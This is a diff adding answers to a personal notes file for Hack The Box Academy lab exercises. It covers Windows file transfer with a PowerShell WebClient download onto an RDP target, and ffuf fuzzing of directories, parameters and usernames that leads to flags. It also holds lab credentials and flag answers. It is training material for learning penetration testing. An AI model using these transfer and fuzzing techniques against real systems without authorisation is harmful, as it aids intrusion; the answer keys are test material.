@@ -1584,75 +1584,96 @@ Results:  172.16.16.160
 
 Results:  Cleartext Transmission of Sensitive Information via HTTP
 
-
-
-Question
-
-```
-
-```
-
-Results:  
-
-
-
-
-
-Question
-
-```
-
-```
-
-Results:  
-
-
-
-
-Question
-
-```
-
-```
-
-Results:  
-
-
-
-
-Question
-
-```
-
-```
-
-Results:  
-
-
-
-
-Question
-
-```
-
-```
-
-Results:  
-
-
-
-
-Question
-
-```
-
-```
-
-Results:  
-
-
-
 ## [File Transfers](https://academy.hackthebox.com/module/details/24)
+
+### Windows File Transfer methods
+
+**Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.**
+
+```bash
+curl http://$ip:80/flag.txt
+```
+
+Results:  b1a4ca918282fcd96004565521944a3b
+
+RDP to 10.129.201.55 (ACADEMY-MISC-MS02) with user "htb-student" and password "HTB_@cademy_stdnt!".
+**Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.**
+
+```
+# First download the file to your kali. Second, run a server, for instance this PHP server
+sudo php -S 0.0.0.0:80
+
+# Launch a RDP connection
+xfreerdp /cert:ignore /u:$user /p:$pass /v:$ip
+
+# In the windows machine, open Powershell and retrieve the file:
+(New-Object Net.WebClient).DownloadFile('http://$ip/upload_win.zip','C:\Users\htb-student\Desktop\upload_win.zip')
+
+# Unzip it in the Desktop. Open cmd and run:
+hasher C:\Users\htb-student\Desktop\upload_win\upload_win.txt
+```
+
+Results:  f458303ea783c224c6b4e7ef7f17eb9d
+
+
+### Linux File Transfer methods
+
+
+Question
+
+```
+
+```
+
+Results:  
+
+
+### Transferring Files with Code
+
+Question
+
+```
+
+```
+
+Results:  
+
+###  Miscellaneous File Transfer Methods
+
+
+Question
+
+```
+
+```
+
+Results:  
+
+
+### Living off the Land
+
+Question
+
+```
+
+```
+
+Results:  
+
+
+
+
+Question
+
+```
+
+```
+
+Results:  
+
+
+
+
 
 ## [Shells & Payloads](https://academy.hackthebox.com/module/details/115)
 
@@ -2003,30 +2024,36 @@ Results: php phps php7
 ** One of the pages you will identify should say 'You don't have access!'. What is the full page URL?.**
 
 ``` shell-session 
-
+ffuf -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://faculty.academy.htb:$port/FUZZ  -recursion -recursion-depth 1 -e .php,.php7,.phps -fc 403
 
 ```
 
-Results: 
+Results:  http://faculty.academy.htb:PORT/courses/linux-security.php7
 
 ** In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?.**
 
 ``` shell-session 
+# First, we fuzz parameters:
+ffuf -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ  -u http://faculty.academy.htb:$port/courses/linux-security.php7?FUZZ=1   -fs 774
 
+# We obtain user. We enter http://faculty.academy.htb:$port/courses/linux-security.php7?user=admin in the browsers. When accessing, we read the message "This method is no longer used." printed on the screen. So we try to FUZZ the value of the user parameter with the POST method
+ffuf -w  /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ  -u "http://faculty.academy.htb:$port/courses/linux-security.php7"  -X POST -d "FUZZ=key" -H 'Content-Type: application/x-www-form-urlencoded'  -fs 774 
 
 ```
 
-Results: 
+Results:  user, username
 
 
 **Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?.**
 
 ``` shell-session 
+ffuf -w  /usr/share/seclists/Usernames/Names/names.txt:FUZZ  -u "http://faculty.academy.htb:$port/courses/linux-security.php7"  -X POST -d "username=FUZZ" -H 'Content-Type: application/x-www-form-urlencoded'  -fs 781
 
-
+# This returns 'harry'. Now we curl that url
+curl  "http://faculty.academy.htb:$port/courses/linux-security.php7"  -X POST -d "username=harry"  
 ```
 
-Results: 
+Results:  HTB{w3b_fuzz1n6_m4573r}
 
 
 
